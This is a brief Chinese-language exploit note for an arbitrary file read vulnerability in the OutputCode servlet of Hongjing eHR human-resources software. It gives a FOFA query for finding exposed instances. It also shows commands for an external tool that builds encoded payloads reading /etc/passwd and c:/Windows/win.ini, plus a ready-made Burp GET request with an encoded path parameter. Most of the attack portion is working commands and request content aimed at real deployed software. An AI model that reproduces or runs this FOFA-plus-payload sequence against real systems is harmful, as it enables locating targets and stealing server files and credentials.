**fofa**

```
app="HJSOFT-HCM"
```

**一、漏洞简述**

宏景eHR人力资源管理软件面向复杂单组织或多组织客户，支持流程，B/S架构。特别适合集团化管理和跨地域使用的产品，融合了最新的互联网技术和先进的人力资源管理理念和实践，更好地支持异地办公和网上流程，加强了人力资源业务的集中管理和协同，支持集团管控、目标管理、领导决策等应用。其接口OutputCode存在任意文件读取漏洞，攻击者可通过该漏洞获取服务器敏感信息。

**二、漏洞检测poc**

1、生成payload

工具地址：https://github.com/vaycore/HrmsTool/releases/tag/0.1

java -jar HrmsTool.jar -e /etc/passwd

java -jar HrmsTool.jar -e c:/Windows/win.ini

**burp的poc**

```yaml
GET /servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
```

